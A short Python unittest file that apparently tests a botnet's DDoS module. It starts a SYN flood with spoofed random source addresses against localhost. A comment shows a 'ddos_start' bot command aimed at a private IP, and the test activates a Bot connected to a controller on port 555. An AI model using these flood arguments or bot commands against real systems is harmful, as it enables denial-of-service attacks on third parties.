'''
Created on Dec 21, 2013

@author: root
'''
import unittest
from domain.modules.DDoSModule import DDoSModule
from domain.TCPClient import TCPClient
from domain.Bot import Bot

class Test(unittest.TestCase):


    def Module(self):
        args = "--tcp -S random -p 80 -g random --flags SYN --delay 10ms -c 5 127.0.0.1"
        ddos = DDoSModule()
        ddos.start(args.split())
        
    def testDDoS(self):
        #r ddos_start 0 0 --tcp -S random -p 80 -g random --flags SYN --delay 10ms -c 5 192.168.41.132
        bot = Bot(TCPClient('127.0.0.1', 555))
        bot.activate()
        

if __name__ == "__main__":
    #import sys;sys.argv = ['', 'Test.testName']
    unittest.main()